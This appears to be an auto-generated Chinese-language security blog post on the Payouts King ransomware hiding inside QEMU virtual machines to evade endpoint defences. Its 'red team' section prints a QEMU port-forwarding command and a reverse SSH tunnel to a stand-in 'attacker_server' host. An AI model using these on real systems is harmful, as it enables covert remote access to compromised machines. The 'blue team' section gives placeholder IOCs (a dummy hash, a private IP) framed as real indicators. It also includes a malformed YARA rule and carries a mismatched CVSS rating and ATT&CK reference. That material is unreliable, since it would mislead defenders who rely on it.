---
layout: post
title:  "Payouts King ransomware uses QEMU VMs to bypass endpoint security"
date:   2026-04-18 01:48:10 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Payouts King 勒索軟體的 QEMU 虛擬機繞過技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: QEMU 虛擬機、SSH 反向通道、AES-256 加密

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Payouts King 勒索軟體利用 QEMU 虛擬機創建一個隱藏的虛擬機，從而繞過端點安全防護。這是因為 QEMU 虛擬機可以運行在主機上，且安全解決方案無法掃描虛擬機內的內容。
* **攻擊流程圖解**:
  1. 攻擊者創建一個 QEMU 虛擬機，並將其設置為 SYSTEM 權限。
  2. 虛擬機運行 Alpine Linux 作業系統，並包含攻擊者工具，如 AdaptixC2、Chisel、BusyBox 和 Rclone。
  3. 攻擊者使用虛擬磁碟文件偽裝成數據庫和 DLL 文件，並設置端口轉發以提供隱藏的 SSH 反向通道。
* **受影響元件**: QEMU 虛擬機、Alpine Linux 作業系統、Windows 主機

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得主機的 SYSTEM 權限，並且需要 QEMU 虛擬機的安裝和配置。
* **Payload 建構邏輯**:

    ```
    
    python
      # QEMU 虛擬機配置文件
      qemu-system-x86_64 -m 2048 -vnc :0 -device virtio-net,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22
    
    ```
 

```

bash
  # SSH 反向通道配置
  ssh -R 5555:localhost:22 user@attacker_server

```
* **繞過技術**: 攻擊者可以使用 QEMU 虛擬機的隱藏功能來繞過端點安全防護，例如使用虛擬磁碟文件偽裝成數據庫和 DLL 文件。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker_server.com | C:\Windows\Temp\qemu-system-x86_64.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule QEMU_Virtual_Machine {
        meta:
          description = "QEMU 虛擬機偵測"
          author = "Blue Team"
        strings:
          $qemu_system_x86_64 = "qemu-system-x86_64.exe"
        condition:
          $qemu_system_x86_64 in (pe.imports)
      }
    
    ```
* **緩解措施**: 封鎖 QEMU 虛擬機的安裝和配置，監控系統日誌和網路流量以偵測可疑活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **QEMU (Quick Emulator)**: 一個開源的 CPU 模擬器和系統虛擬化工具，允許用戶在主機上運行作業系統作為虛擬機。
* **SSH 反向通道 (Reverse SSH Tunnel)**: 一種技術，允許用戶從遠程主機連接到本地主機的 SSH 服務。
* **AES-256 (Advanced Encryption Standard)**: 一種對稱加密算法，使用 256 位元的密鑰進行加密和解密。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/payouts-king-ransomware-uses-qemu-vms-to-bypass-endpoint-security/)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1215/)


